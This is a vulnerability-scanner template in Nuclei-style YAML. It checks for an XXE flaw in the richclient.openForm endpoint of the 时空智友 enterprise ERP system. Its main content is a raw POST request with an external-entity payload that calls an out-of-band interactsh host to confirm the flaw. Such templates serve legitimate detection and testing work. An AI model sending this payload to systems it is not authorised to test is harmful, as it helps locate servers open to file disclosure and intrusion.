id: skzy-erp-richclient-openForm-xxe
info:
  name: 时空智友企业流程化管控系统 /formservice?service=richclient.openForm XML 外部实体注入漏洞
  author: leadlife
  severity: high
  description: 时空智友企业流程化管控系统是一款企业信息管理软件，主要用于优化企业内部流程。然而，该系统可能存在 XML外部实体注入（XXE）漏洞，攻击者可以利用此漏洞读取服务器文件或执行恶意操作
  reference: 
    - https://github.com/zan8in/afrog/blob/8fa11133d4a81168ece44aadfb14bb7b69f4df2e/pocs/temp/afrog-pocs/vulnerability/shikongzhiyou-richclient.openform-xxe.yaml#L4
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips:
    repair:
    version:
  tags: oob,xxe,skzy

http:
  - raw:
      - |
        POST /formservice?service=richclient.openForm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        
        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]>
        <request>
        <data>&xxe;</data>
        </request>
      
        
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or